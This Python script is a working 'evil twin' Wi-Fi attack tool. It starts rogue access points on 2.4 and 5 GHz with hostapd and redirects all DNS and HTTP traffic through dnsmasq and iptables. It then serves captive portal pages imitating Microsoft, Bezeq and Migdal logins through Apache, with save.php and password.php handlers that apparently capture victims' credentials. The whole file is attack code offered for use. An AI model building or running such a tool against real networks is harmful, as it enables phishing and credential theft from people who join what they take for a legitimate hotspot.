import os
import sys
import subprocess
import argparse
import signal
import time
import ipaddress
import shutil
import threading, re

dnsmasq_proc = None
hostapd_proc = None
script_args = None

class Colors:
    RESET   = "\033[0m"
    BOLD    = "\033[1m"
    RED     = "\033[31m"
    GREEN   = "\033[32m"
    YELLOW  = "\033[33m"
    BLUE    = "\033[34m"
    MAGENTA = "\033[35m"
    CYAN    = "\033[36m"
    WHITE   = "\033[37m"
    DIM     = "\033[2m"

CONNECT_RE    = re.compile(r'AP-STA-CONNECTED\s+([0-9a-f:]{17})', re.I)
DISCONNECT_RE = re.compile(r'AP-STA-DISCONNECTED\s+([0-9a-f:]{17})', re.I)
ASSOC_RE      = re.compile(r'STA\s+([0-9a-f:]{17}).*(authenticated|associated)', re.I)
hostapd_procs = []

def stream_hostapd_events(tag: str, proc: subprocess.Popen):
    try:
        for line in proc.stdout:
            if not line:
                break
            s = line.strip()
            if CONNECT_RE.search(s) or DISCONNECT_RE.search(s) or ASSOC_RE.search(s):
                print(f"[hostapd:{tag}] {s}", flush=True)
    except Exception as e:
        print(f"{Colors.RED}(>.<) hostapd stream error ({tag}): {e}{Colors.RESET}")


def run_command(command, suppress_output=True, ignore_errors=False):
    try:
        stdout = subprocess.DEVNULL if suppress_output else None
        stderr = subprocess.DEVNULL if suppress_output else None
        subprocess.run(command, check=True, stdout=stdout, stderr=stderr)
        return True
    except (subprocess.CalledProcessError, FileNotFoundError) as e:
        if not ignore_errors:
            print(f"{Colors.RED}(>.<) Error executing command: {' '.join(command)}{Colors.RESET}")
            print(f"{Colors.RED} Details: {e}{Colors.RESET}")
        return False
    
#####################################################################3

def check_root():
    if os.geteuid() != 0:
        print(f"{Colors.YELLOW}(>.<) This Tool must be run as root!{Colors.RESET}")
        sys.exit(1)
    print(f"{Colors.GREEN}(^.^) Running with Root privileges :){Colors.RESET}")

#####################################################################

def check_dependencies():
    dependencies = ['apache2', 'php', 'hostapd', 'dnsmasq']
    missing = []
    for dep in dependencies:
        if subprocess.call(['dpkg-query', '-W', '-f=${Status}', dep], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL) != 0:
            missing.append(dep)

    if missing:
        print(f"{Colors.YELLOW}(@.@) The following required packages are not installed:{Colors.RESET}")
        for pkg in missing:
            print(f"  - {pkg}")
        print("Please install them manually before running this script.")
        print("Example: sudo apt update && sudo apt install -y " + " ".join(missing))
        sys.exit(1)
    print(f"{Colors.GREEN}(^.^) All dependencies are installed.{Colors.RESET}")

#####################################################################

def manage_service(service_name, action='stop'):
    service_cmd = ['systemctl', action, service_name]
    run_command(service_cmd, ignore_errors=True)
    print(f"{Colors.GREEN}(^.^) {service_name} {action} command issued.{Colors.RESET}")

#####################################################################

def toggle_ip_forwarding(enable=True):
    action = "Enabling" if enable else "Disabling"
    value = "1" if enable else "0"
    try:
        with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
            f.write(value)
        return True
    except IOError as e:
        print(f"{Colors.RED}(>.<) Failed to {action.lower()} IP forwarding: {e}{Colors.RESET}")
        return False

#####################################################################

def configure_interface(iface, network_str):
    try:
        network = ipaddress.ip_network(network_str)
        ip_addr = str(next(network.hosts()))
        
        commands = [
            ['ip', 'link', 'set', iface, 'down'],
            ['ip', 'addr', 'flush', 'dev', iface],
            ['ip', 'addr', 'add', f"{ip_addr}/{network.prefixlen}", 'dev', iface],
            ['ip', 'link', 'set', iface, 'up']
        ]
        
        for cmd in commands:
            if not run_command(cmd):
                raise Exception(f"{Colors.RED}(>.<) Failed to execute: {' '.join(cmd)}{Colors.RESET}")
                
        print(f"{Colors.GREEN}(^.^) Interface {iface} configured with IP {ip_addr}{Colors.RESET}")
        return ip_addr
    except Exception as e:
        print(f"(>.<) {Colors.RED}[-] Failed to configure interface: {e}{Colors.RESET}")
        sys.exit(1)



#####################################################################

def create_dnsmasq_conf(iface, ip_addr, network_str):
    try:
        network = ipaddress.ip_network(network_str)
        dhcp_start = str(network.network_address + 10)
        dhcp_end = str(network.network_address + 100)
        
        config_content = f"""
interface={iface}
bind-interfaces
no-resolv
log-queries
dhcp-range={dhcp_start},{dhcp_end},12h
dhcp-option=3,{ip_addr}
dhcp-option=6,{ip_addr}
address=/#/{ip_addr}
address=/captive.apple.com/{ip_addr}
address=/www.msftconnecttest.com/{ip_addr}
address=/connectivitycheck.gstatic.com/{ip_addr}
"""
        with open("dnsmasq.conf", "w") as f:
            f.write(config_content.strip())
        print(f"{Colors.GREEN}(^.^) dnsmasq.conf created successfully.{Colors.RESET}")
    except Exception as e:
        print(f"{Colors.RED}(>.<) Failed to create dnsmasq.conf: {e}{Colors.RESET}")
        sys.exit(1)

#####################################################################

def create_dnsmasq_conf_dual(iface1, iface2, ip_addr, network_str):
    try:
        network = ipaddress.ip_network(network_str)
        dhcp_start = str(network.network_address + 10)
        dhcp_end = str(network.network_address + 100)
        
        config_content = f"""
interface={iface1}
interface={iface2}
bind-interfaces
no-resolv
log-queries
dhcp-range={iface1},{dhcp_start},{dhcp_end},12h
dhcp-range={iface2},{dhcp_start},{dhcp_end},12h
dhcp-option={iface1},3,{ip_addr}
dhcp-option={iface2},3,{ip_addr}
dhcp-option={iface1},6,{ip_addr}
dhcp-option={iface2},6,{ip_addr}
address=/#/{ip_addr}
address=/captive.apple.com/{ip_addr}
address=/www.msftconnecttest.com/{ip_addr}
address=/connectivitycheck.gstatic.com/{ip_addr}
"""
        with open("dnsmasq_dual.conf", "w") as f:
            f.write(config_content.strip())
        print(f"{Colors.GREEN}(^.^) DNS configuration file created successfully.{Colors.RESET}")
    except Exception as e:
        print(f"{Colors.RED}(>.<) Failed to create dnsmasq.conf: {e}{Colors.RESET}")
        sys.exit(1)

#####################################################################
def create_hostapd_conf2_4(iface, ssid, channel):
    config_content = f"""
interface={iface}
driver=nl80211
ssid={ssid}
hw_mode=g
channel={channel}
auth_algs=1
wmm_enabled=0
"""
    try:
        with open("hostapd_24.conf", "w") as f:
            f.write(config_content.strip())
        print(f"{Colors.GREEN}(^.^) HotSpot 2.4GHz Configuration file created successfully.{Colors.RESET}")
    except Exception as e:
        print(f"{Colors.RED}(>.<) Failed to create hostapd.conf: {e}{Colors.RESET}")
        sys.exit(1)

#####################################################################

def create_hostapd_conf5(iface, ssid, channel):
    config_content = f"""
interface={iface}
driver=nl80211
ssid={ssid}
hw_mode=a
channel={channel}
auth_algs=1
wmm_enabled=1
"""
    try:
        with open("hostapd_5.conf", "w") as f:
            f.write(config_content.strip())
        print(f"{Colors.GREEN}(^.^) HotSpot 5GHz Configuration file created successfully.{Colors.RESET}")
    except Exception as e:
        print(f"{Colors.RED}(>.<) Failed to create hostapd.conf: {e}{Colors.RESET}")
        sys.exit(1)

#####################################################################

def setup_apache():
    commands = [
        ['systemctl', 'start', 'apache2'],
        ['a2enmod', 'rewrite'],
        ['a2enmod', 'headers'],
        ['systemctl', 'restart', 'apache2']
    ]
    for cmd in commands:
        if not run_command(cmd):
            print(f"{Colors.RED}(>.<) Failed to configure Apache...{Colors.RESET}")
            sys.exit(1)
    print(f"{Colors.GREEN}(^.^) Apache2 Server started successfully.{Colors.RESET}")

#####################################################################

def setup_captive_portal_files(Cap: str):
    portal_dir = "/var/www/captive"
          
    if not os.path.exists(portal_dir):
        if not run_command(['mkdir', '-p', portal_dir]):
            sys.exit(1)
    
    try:
        if Cap == "default":
            shutil.copy("Default/index.html", os.path.join(portal_dir, "index.html"))
            shutil.copy("Default/save.php", os.path.join(portal_dir, "save.php"))
        if Cap == "microsoft": 
            shutil.copy("Microsoft/index.html", os.path.join(portal_dir, "index.html"))
            shutil.copy("Microsoft/password.php", os.path.join(portal_dir, "password.php"))
            shutil.copy("Microsoft/save.php", os.path.join(portal_dir, "save.php"))
            shutil.copy("Microsoft/save2.php", os.path.join(portal_dir, "save2.php"))
            shutil.copy("Microsoft/microsoft.svg", os.path.join(portal_dir, "microsoft.svg"))
        if Cap == "bezeq": 
            shutil.copy("Bezeq/index.html", os.path.join(portal_dir, "index.html"))
            shutil.copy("Bezeq/save.php", os.path.join(portal_dir, "save.php"))
            shutil.copy("Bezeq/route_simple.png", os.path.join(portal_dir, "route_simple.png"))
            shutil.copy("Bezeq/sn.png", os.path.join(portal_dir, "sn.png"))
            shutil.copy("Bezeq/b.png", os.path.join(portal_dir, "b.png"))
        if Cap == "migdal": 
            shutil.copy("Migdal/index.html", os.path.join(portal_dir, "index.html"))
            shutil.copy("Migdal/save.php", os.path.join(portal_dir, "save.php"))
            shutil.copy("Migdal/save2.php", os.path.join(portal_dir, "save2.php"))
            shutil.copy("Migdal/password.php", os.path.join(portal_dir, "password.php"))
            shutil.copy("Migdal/logo.svg", os.path.join(portal_dir, "logo.svg"))
        
        print(f"{Colors.GREEN}(^.^) Captive portal files copied successfully.{Colors.RESET}")
    except Exception as e:
        print(f"{Colors.RED}(>.<) Failed to copy portal files: {e}{Colors.RESET}")
        sys.exit(1)

#####################################################################

def setup_captive_portal_files_dual(Cap: str):
    portal_dir = "/var/www/captive_dual"
    
    if not os.path.exists(portal_dir):
        if not run_command(['mkdir', '-p', portal_dir]):
            sys.exit(1)
    
    try:
        if Cap == "default":
            shutil.copy("Default/Dual/index.html", os.path.join(portal_dir, "index.html"))
            shutil.copy("Default/Dual/save.php", os.path.join(portal_dir, "save.php"))
        if Cap == "microsoft": 
            shutil.copy("Microsoft/Dual/index.html", os.path.join(portal_dir, "index.html"))
            shutil.copy("Microsoft/Dual/password.php", os.path.join(portal_dir, "password.php"))
            shutil.copy("Microsoft/Dual/save.php", os.path.join(portal_dir, "save.php"))
            shutil.copy("Microsoft/Dual/save2.php", os.path.join(portal_dir, "save2.php"))
            shutil.copy("Microsoft/Dual/microsoft.svg", os.path.join(portal_dir, "microsoft.svg"))
        if Cap == "bezeq": 
            shutil.copy("Bezeq/Dual/index.html", os.path.join(portal_dir, "index.html"))
            shutil.copy("Bezeq/Dual/save.php", os.path.join(portal_dir, "save.php"))
            shutil.copy("Bezeq/Dual/route_simple.png", os.path.join(portal_dir, "route_simple.png"))
            shutil.copy("Bezeq/Dual/sn.png", os.path.join(portal_dir, "sn.png"))
            shutil.copy("Bezeq/Dual/b.png", os.path.join(portal_dir, "b.png"))
        if Cap == "migdal": 
            shutil.copy("Migdal/Dual/index.html", os.path.join(portal_dir, "index.html"))
            shutil.copy("Migdal/Dual/save.php", os.path.join(portal_dir, "save.php"))
            shutil.copy("Migdal/Dual/save2.php", os.path.join(portal_dir, "save2.php"))
            shutil.copy("Migdal/Dual/password.php", os.path.join(portal_dir, "password.php"))
            shutil.copy("Migdal/Dual/logo.svg", os.path.join(portal_dir, "logo.svg"))
        
        print(f"{Colors.GREEN}(^.^) Captive portal files copied successfully.{Colors.RESET}")
    except Exception as e:
        print(f"{Colors.RED}(>.<) Failed to copy portal files: {e}{Colors.RESET}")
        sys.exit(1)

#####################################################################
def setup_log_file():
    log_file = "/var/log/ca.log"
    try:
        if not os.path.exists(log_file):
            run_command(['touch', log_file])
        
        www_data_uid = int(subprocess.check_output(['id', '-u', 'www-data']).strip())
        www_data_gid = int(subprocess.check_output(['id', '-g', 'www-data']).strip())
        
        os.chown(log_file, www_data_uid, www_data_gid)
        os.chmod(log_file, 0o640)
        print(f"{Colors.GREEN}(^.^) Log file created successfull (It will removed automatically).{Colors.RESET}")
    except Exception as e:
        print(f"{Colors.RED}(>.<) Failed to set up log file: {e}{Colors.RESET}")
        sys.exit(1)

#####################################################################

def setup_log_file_dual():
    log_file = "/var/log/ca2.log"
    try:
        if not os.path.exists(log_file):
            run_command(['touch', log_file])
        
        www_data_uid = int(subprocess.check_output(['id', '-u', 'www-data']).strip())
        www_data_gid = int(subprocess.check_output(['id', '-g', 'www-data']).strip())
        
        os.chown(log_file, www_data_uid, www_data_gid)
        os.chmod(log_file, 0o640)
        print(f"{Colors.GREEN}(^.^) Log file created successfull (It will removed automatically).{Colors.RESET}")
    except Exception as e:
        print(f"{Colors.RED}(>.<) Failed to set up log file: {e}{Colors.RESET}")
        sys.exit(1)
        
#####################################################################

def create_vhost():
    vhost_file = "/etc/apache2/sites-available/captive.conf"
    
    vhost_content = r"""
<VirtualHost *:80>
    ServerName captive.portal
    ServerAlias *
    DocumentRoot /var/www/captive
    <Directory /var/www/captive>
        AllowOverride All
        Require all granted
    </Directory>
    Alias /hotspot-detect.html /var/www/captive/index.html
    Alias /generate_204 /var/www/captive/index.html
    Alias /connecttest.txt /var/www/captive/index.html
    RewriteEngine On
    RewriteCond %{REQUEST_URI} !^/save\.php$
    RewriteRule ^.*$ /index.html [L]
    Header always set Cache-Control "no-store, no-cache, must-revalidate, max-age=0"
    Header always set Pragma "no-cache"
    Header always set Expires "0"
</VirtualHost>
"""
    try:
        with open(vhost_file, "w") as f:
            f.write(vhost_content.strip())
        print(f"{Colors.GREEN}(^.^) VHost Created Successfully.{Colors.RESET}")
    except Exception as e:
        print(f"{Colors.RED}(>.<) Failed to create VirtualHost file: {e}{Colors.RESET}")
        sys.exit(1)

#####################################################################
def create_vhost_dual():
    vhost_file = "/etc/apache2/sites-available/captive2.conf"
    
    vhost_content = r"""
<VirtualHost *:80>
    ServerName captive.portal
    ServerAlias *
    DocumentRoot /var/www/captive
    <Directory /var/www/captive>
        AllowOverride All
        Require all granted
    </Directory>
    Alias /hotspot-detect.html /var/www/captive/index.html
    Alias /generate_204 /var/www/captive/index.html
    Alias /connecttest.txt /var/www/captive/index.html
    RewriteEngine On
    RewriteCond %{REQUEST_URI} !^/save\.php$
    RewriteRule ^.*$ /index.html [L]
    Header always set Cache-Control "no-store, no-cache, must-revalidate, max-age=0"
    Header always set Pragma "no-cache"
    Header always set Expires "0"
</VirtualHost>
"""
    try:
        with open(vhost_file, "w") as f:
            f.write(vhost_content.strip())
        print(f"{Colors.GREEN}(^.^) VHost Created Successfully.{Colors.RESET}")
    except Exception as e:
        print(f"{Colors.RED}(>.<) Failed to create VirtualHost file: {e}{Colors.RESET}")
        sys.exit(1)

#####################################################################

def create_vhost_microsoft():
    vhost_file = "/etc/apache2/sites-available/captive.conf"
    
    vhost_content = r"""
<VirtualHost *:80>
    ServerName captive.portal
    ServerAlias *
    DocumentRoot /var/www/captive

    <Directory /var/www/captive>
        AllowOverride None
        Require all granted
        Options -MultiViews
    </Directory>

    Alias /hotspot-detect.html /var/www/captive/index.html
    Alias /generate_204       /var/www/captive/index.html
    Alias /connecttest.txt    /var/www/captive/index.html

    RewriteEngine On
    RewriteCond %{REQUEST_URI} !^/(hotspot-detect\.html|generate_204|connecttest\.txt)$
    RewriteRule ^/?(save\.php|password\.php|save2\.php|microsoft\.svg)$ - [L]
    RewriteCond %{REQUEST_FILENAME} -f [OR]
    RewriteCond %{REQUEST_FILENAME} -d
    RewriteRule ^ - [L]
    RewriteRule ^ /index.html [L]

    Header always set Cache-Control "no-store, no-cache, must-revalidate, max-age=0"
    Header always set Pragma "no-cache"
    Header always set Expires "0"
    Header always set X-VHost "captive-portal"

    AddType image/svg+xml .svg .svgz

</VirtualHost>
"""
    try:
        with open(vhost_file, "w") as f:
            f.write(vhost_content.strip())
        print(f"{Colors.GREEN}(^.^) VHost Created Successfully.{Colors.RESET}")
    except Exception as e:
        print(f"{Colors.RED}(>.<) Failed to create VirtualHost file: {e}{Colors.RESET}")
        sys.exit(1)

#####################################################################

def create_vhost_microsoft_dual():
    vhost_file = "/etc/apache2/sites-available/captive2.conf"
    
    vhost_content = r"""
<VirtualHost *:80>
    ServerName captive.portal
    ServerAlias *
    DocumentRoot /var/www/captive

    <Directory /var/www/captive>
        AllowOverride None
        Require all granted
        Options -MultiViews
    </Directory>

    Alias /hotspot-detect.html /var/www/captive/index.html
    Alias /generate_204       /var/www/captive/index.html
    Alias /connecttest.txt    /var/www/captive/index.html

    RewriteEngine On
    RewriteCond %{REQUEST_URI} !^/(hotspot-detect\.html|generate_204|connecttest\.txt)$
    RewriteRule ^/?(save\.php|password\.php|save2\.php|microsoft\.svg)$ - [L]
    RewriteCond %{REQUEST_FILENAME} -f [OR]
    RewriteCond %{REQUEST_FILENAME} -d
    RewriteRule ^ - [L]
    RewriteRule ^ /index.html [L]

    Header always set Cache-Control "no-store, no-cache, must-revalidate, max-age=0"
    Header always set Pragma "no-cache"
    Header always set Expires "0"
    Header always set X-VHost "captive-portal"

    AddType image/svg+xml .svg .svgz

</VirtualHost>
"""
    try:
        with open(vhost_file, "w") as f:
            f.write(vhost_content.strip())
        print(f"{Colors.GREEN}(^.^) VHost Created Successfully.{Colors.RESET}")
    except Exception as e:
        print(f"{Colors.RED}(>.<) Failed to create VirtualHost file: {e}{Colors.RESET}")
        sys.exit(1)

#####################################################################

def create_vhost_migdal_dual():
    vhost_file = "/etc/apache2/sites-available/captive2.conf"
    
    vhost_content = r"""
<VirtualHost *:80>
    ServerName captive.portal
    ServerAlias *
    DocumentRoot /var/www/captive

    <Directory /var/www/captive>
        AllowOverride None
        Require all granted
        Options -MultiViews
    </Directory>

    Alias /hotspot-detect.html /var/www/captive/index.html
    Alias /generate_204       /var/www/captive/index.html
    Alias /connecttest.txt    /var/www/captive/index.html

    RewriteEngine On
    RewriteCond %{REQUEST_URI} !^/(hotspot-detect\.html|generate_204|connecttest\.txt)$
    RewriteRule ^/?(save\.php|password\.php|save2\.php|logo\.svg)$ - [L]
    RewriteCond %{REQUEST_FILENAME} -f [OR]
    RewriteCond %{REQUEST_FILENAME} -d
    RewriteRule ^ - [L]
    RewriteRule ^ /index.html [L]

    Header always set Cache-Control "no-store, no-cache, must-revalidate, max-age=0"
    Header always set Pragma "no-cache"
    Header always set Expires "0"
    Header always set X-VHost "captive-portal"

    AddType image/svg+xml .svg .svgz

</VirtualHost>
"""
    try:
        with open(vhost_file, "w") as f:
            f.write(vhost_content.strip())
        print(f"{Colors.GREEN}(^.^) VHost Created Successfully.{Colors.RESET}")
    except Exception as e:
        print(f"{Colors.RED}(>.<) Failed to create VirtualHost file: {e}{Colors.RESET}")
        sys.exit(1)


#####################################################################

def create_vhost_migdal():
    vhost_file = "/etc/apache2/sites-available/captive.conf"
    
    vhost_content = r"""
<VirtualHost *:80>
    ServerName captive.portal
    ServerAlias *
    DocumentRoot /var/www/captive

    <Directory /var/www/captive>
        AllowOverride None
        Require all granted
        Options -MultiViews
    </Directory>

    Alias /hotspot-detect.html /var/www/captive/index.html
    Alias /generate_204       /var/www/captive/index.html
    Alias /connecttest.txt    /var/www/captive/index.html

    RewriteEngine On
    RewriteCond %{REQUEST_URI} !^/(hotspot-detect\.html|generate_204|connecttest\.txt)$
    RewriteRule ^/?(save\.php|password\.php|save2\.php|logo\.svg)$ - [L]
    RewriteCond %{REQUEST_FILENAME} -f [OR]
    RewriteCond %{REQUEST_FILENAME} -d
    RewriteRule ^ - [L]
    RewriteRule ^ /index.html [L]

    Header always set Cache-Control "no-store, no-cache, must-revalidate, max-age=0"
    Header always set Pragma "no-cache"
    Header always set Expires "0"
    Header always set X-VHost "captive-portal"

    AddType image/svg+xml .svg .svgz

</VirtualHost>
"""
    try:
        with open(vhost_file, "w") as f:
            f.write(vhost_content.strip())
        print(f"{Colors.GREEN}(^.^) VHost Created Successfully.{Colors.RESET}")
    except Exception as e:
        print(f"{Colors.RED}(>.<) Failed to create VirtualHost file: {e}{Colors.RESET}")
        sys.exit(1)

#####################################################################

def create_vhost_bezeq():
    vhost_file = "/etc/apache2/sites-available/captive.conf"
    
    vhost_content = r"""
<VirtualHost *:80>
    ServerName captive.portal
    ServerAlias *
    DocumentRoot /var/www/captive

    <Directory /var/www/captive>
        Options -MultiViews
        AllowOverride None
        Require all granted
        DirectoryIndex index.html index.php
    </Directory>

    Alias /hotspot-detect.html /var/www/captive/index.html
    Alias /generate_204       /var/www/captive/index.html
    Alias /connecttest.txt    /var/www/captive/index.html

    RewriteEngine On


    RewriteCond %{REQUEST_URI} !^/(hotspot-detect\.html|generate_204|connecttest\.txt)$

    RewriteRule ^/?(save\.php|password\.php|save2\.php|microsoft\.svg)$ - [L,NC]

    RewriteCond %{REQUEST_FILENAME} -f [OR]
    RewriteCond %{REQUEST_FILENAME} -d
    RewriteRule ^ - [L]


    RewriteRule \.(?:css|js|png|jpe?g|gif|ico|svg|webp|woff2?|ttf|eot|map)$ - [L,NC]

    RewriteRule ^ /index.html [L]

    Header always set Cache-Control "no-store, no-cache, must-revalidate, max-age=0"
    Header always set Pragma "no-cache"
    Header always set Expires "0"
    Header always set X-VHost "captive-portal"

    AddType image/svg+xml .svg .svgz
</VirtualHost>
"""
    try:
        with open(vhost_file, "w") as f:
            f.write(vhost_content.strip())
        print(f"{Colors.GREEN}(^.^) VHost Created Successfully.{Colors.RESET}")
    except Exception as e:
        print(f"{Colors.RED}(>.<) Failed to create VirtualHost file: {e}{Colors.RESET}")
        sys.exit(1)

#####################################################################

def create_vhost_bezeq_dual():
    vhost_file = "/etc/apache2/sites-available/captive2.conf"
    
    vhost_content = r"""
<VirtualHost *:80>
    ServerName captive.portal
    ServerAlias *
    DocumentRoot /var/www/captive

    <Directory /var/www/captive>
        Options -MultiViews
        AllowOverride None
        Require all granted
        DirectoryIndex index.html index.php
    </Directory>

    Alias /hotspot-detect.html /var/www/captive/index.html
    Alias /generate_204       /var/www/captive/index.html
    Alias /connecttest.txt    /var/www/captive/index.html

    RewriteEngine On

    RewriteCond %{REQUEST_URI} !^/(hotspot-detect\.html|generate_204|connecttest\.txt)$

    RewriteRule ^/?(save\.php|password\.php|save2\.php|microsoft\.svg)$ - [L,NC]

    RewriteCond %{REQUEST_FILENAME} -f [OR]
    RewriteCond %{REQUEST_FILENAME} -d
    RewriteRule ^ - [L]


    RewriteRule \.(?:css|js|png|jpe?g|gif|ico|svg|webp|woff2?|ttf|eot|map)$ - [L,NC]

    RewriteRule ^ /index.html [L]

    Header always set Cache-Control "no-store, no-cache, must-revalidate, max-age=0"
    Header always set Pragma "no-cache"
    Header always set Expires "0"
    Header always set X-VHost "captive-portal"

    AddType image/svg+xml .svg .svgz
</VirtualHost>
"""
    try:
        with open(vhost_file, "w") as f:
            f.write(vhost_content.strip())
        print(f"{Colors.GREEN}(^.^) VHost Created Successfully.{Colors.RESET}")
    except Exception as e:
        print(f"{Colors.RED}(>.<) Failed to create VirtualHost file: {e}{Colors.RESET}")
        sys.exit(1)
        
#####################################################################
def enable_apache_site():
    commands = [
        ['a2ensite', 'captive.conf'],
        ['a2dissite', '000-default.conf'],
        ['systemctl', 'reload', 'apache2']
    ]
    for cmd in commands:
        if not run_command(cmd):
            print(f"{Colors.RED}(>.<) Failed to enable Apache site.{Colors.RESET}")
            sys.exit(1)

#####################################################################

def enable_apache_site_dual():
    commands = [
        ['a2ensite', 'captive.conf'],
        ['a2ensite', 'captive2.conf'],
        ['a2dissite', '000-default.conf'],
        ['systemctl', 'reload', 'apache2']
    ]
    for cmd in commands:
        if not run_command(cmd):
            print(f"{Colors.RED}(>.<) Failed to enable Apache site.{Colors.RESET}")
            sys.exit(1)


#####################################################################

def setup_iptables(iface):
    commands = [
        ['iptables', '-t', 'nat', '-A', 'PREROUTING', '-i', iface, '-p', 'tcp', '--dport', '80', '-j', 'REDIRECT', '--to-ports', '80'],
        ['iptables', '-t', 'nat', '-A', 'PREROUTING', '-i', iface, '-p', 'udp', '--dport', '53', '-j', 'REDIRECT', '--to-ports', '53'],
        ['iptables', '-t', 'nat', '-A', 'PREROUTING', '-i', iface, '-p', 'tcp', '--dport', '53', '-j', 'REDIRECT', '--to-ports', '53']
    ]
    for cmd in commands:
        if not run_command(cmd):
            print(f"{Colors.RED}(>.<) Failed to set up iptables.{Colors.RESET}")
            cleanup(0, 0)
            sys.exit(1)
    print(f"{Colors.GREEN}(^.^) IPtables rules configured successfully.{Colors.RESET}")

#####################################################################

def start_attack():
    global dnsmasq_proc, hostapd_proc

    subprocess.run(['pkill', 'dnsmasq'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    time.sleep(1)

    try:
        dnsmasq_proc = subprocess.Popen(
            ['dnsmasq', '-C', 'dnsmasq.conf', '-d'],
            stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
            text=True, bufsize=1
        )

        
        if script_args.band == "5":
            hostapd_conf = 'hostapd_5.conf' 
        else:
            hostapd_conf = 'hostapd_24.conf'
        hostapd_proc = subprocess.Popen(
            ['hostapd', hostapd_conf],
            stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
            text=True, bufsize=1
        )

        time.sleep(2)

        if dnsmasq_proc.poll() is not None:
            out = dnsmasq_proc.stdout.read() if dnsmasq_proc.stdout else ""
            print(f"{Colors.RED}(>.<) dnsmasq failed to start. Error output:{Colors.RESET}")
            print((out or "").strip())
            raise Exception("dnsmasq failed.")

        if hostapd_proc.poll() is not None:
            out = hostapd_proc.stdout.read() if hostapd_proc.stdout else ""
            print(f"{Colors.RED}(>.<) hostapd failed to start. Error output:{Colors.RESET}")
            print((out or "").strip())
            raise Exception("hostapd failed.")

        threading.Thread(
            target=stream_hostapd_events,
            args=(script_args.iface, hostapd_proc),
            daemon=True
        ).start()

        print(f"{Colors.CYAN}\n[+] EVIL TWIN IS RUNNING on single mode XD{Colors.RESET}")
        print(f"[+] SSID:{Colors.YELLOW}{Colors.BOLD}{script_args.ssid}{Colors.RESET} , On Channel: {Colors.YELLOW}{Colors.BOLD}{script_args.channel}{Colors.RESET}")
        print(f" {Colors.MAGENTA}Press CTRL+C to stop and clean up.{Colors.RESET}")
        print(f" {Colors.MAGENTA}========================================={Colors.RESET}")

    except Exception:
        print("[-] Failed to start attack processes.")
        cleanup(0, 0)
        sys.exit(1)


#####################################################################


def start_attack_dual(channel1: str, channel2: str):
    global dnsmasq_proc, hostapd_procs
    hostapd_procs = []

    subprocess.run(['pkill', 'dnsmasq'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    time.sleep(1)

    try:
        dnsmasq_proc = subprocess.Popen(
            ['dnsmasq', '-C', 'dnsmasq_dual.conf', '-d'],
            stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
            text=True, bufsize=1
        )

        p1 = subprocess.Popen(
            ['hostapd', 'hostapd_24.conf'],
            stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
            text=True, bufsize=1
        )
        p2 = subprocess.Popen(
            ['hostapd', 'hostapd_5.conf'],
            stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
            text=True, bufsize=1
        )
        hostapd_procs = [p1, p2]

        time.sleep(2)

        for name, p in (('dnsmasq', dnsmasq_proc), ('hostapd_24', p1), ('hostapd_5', p2)):
            if p.poll() is not None:
                out = p.stdout.read() if p.stdout else ""
                print(f"[-] {name} failed to start. Error output:\n{out}")
                raise Exception(f"{name} failed.")

        threading.Thread(target=stream_hostapd_events,
                         args=(script_args.iface1, p1), daemon=True).start()
        threading.Thread(target=stream_hostapd_events,
                         args=(script_args.iface2, p2), daemon=True).start()

        print(f"{Colors.CYAN}\n[+] EVIL TWIN IS RUNNING on single mode XD{Colors.RESET}")
        print(f"[+] SSID:{Colors.YELLOW}{Colors.BOLD}{script_args.ssid}{Colors.RESET} , On Channel: {Colors.YELLOW}{Colors.BOLD}{script_args.channel1}{Colors.RESET} and Channel  {Colors.YELLOW}{Colors.BOLD}{script_args.channel1}{Colors.RESET}")
        print(f" {Colors.MAGENTA}Press CTRL+C to stop and clean up.{Colors.RESET}")
        print(f" {Colors.MAGENTA}========================================={Colors.RESET}")

    except Exception:
        print("[-] Failed to start attack processes.")
        cleanup_dual(0, 0)
        sys.exit(1)


#####################################################################

def cleanup_dual(signum, frame):
    print(f"{Colors.DIM}\n\n[*] CTRL+C detected. Cleaning up...{Colors.RESET}")
    
    if dnsmasq_proc:
        dnsmasq_proc.terminate()
        print(f"{Colors.DIM}(#.#) Terminated DNS Server...{Colors.RESET}")
    run_command(['pkill', 'dnsmasq'], ignore_errors=True)
    if hostapd_proc:
        hostapd_proc.terminate()
        print(f"{Colors.DIM}(#.#) Terminated HotSpot...{Colors.RESET}")
    run_command(['pkill', 'hostapd'], ignore_errors=True)


    if script_args.iface1:
        print(f"{Colors.DIM}(#.#) Cleaning IPtables rules...{Colors.RESET}")
        rules = [
            ['-t', 'nat', '-D', 'PREROUTING', '-i', script_args.iface1, '-p', 'tcp', '--dport', '80', '-j', 'REDIRECT', '--to-ports', '80'],
            ['-t', 'nat', '-D', 'PREROUTING', '-i', script_args.iface1, '-p', 'udp', '--dport', '53', '-j', 'REDIRECT', '--to-ports', '53'],
            ['-t', 'nat', '-D', 'PREROUTING', '-i', script_args.iface1, '-p', 'tcp', '--dport', '53', '-j', 'REDIRECT', '--to-ports', '53']
        ]
        for rule in rules:
            run_command(['iptables'] + rule, ignore_errors=True)

    toggle_ip_forwarding(enable=False)

    if script_args.iface1:
        print(f"{Colors.DIM}(#.#) Flushing IP from {script_args.iface1} {Colors.RESET}")
        run_command(['ip', 'addr', 'flush', 'dev', script_args.iface1], ignore_errors=True)
    

    if script_args.iface2:
        rules = [
            ['-t', 'nat', '-D', 'PREROUTING', '-i', script_args.iface2, '-p', 'tcp', '--dport', '80', '-j', 'REDIRECT', '--to-ports', '80'],
            ['-t', 'nat', '-D', 'PREROUTING', '-i', script_args.iface2, '-p', 'udp', '--dport', '53', '-j', 'REDIRECT', '--to-ports', '53'],
            ['-t', 'nat', '-D', 'PREROUTING', '-i', script_args.iface2, '-p', 'tcp', '--dport', '53', '-j', 'REDIRECT', '--to-ports', '53']
        ]
        for rule in rules:
            run_command(['iptables'] + rule, ignore_errors=True)

    toggle_ip_forwarding(enable=False)

    if script_args.iface2:
        print(f"{Colors.DIM}(#.#) Flushing IP from {script_args.iface2} {Colors.RESET}")
        run_command(['ip', 'addr', 'flush', 'dev', script_args.iface2], ignore_errors=True)

    manage_service('systemd-resolved', 'start')
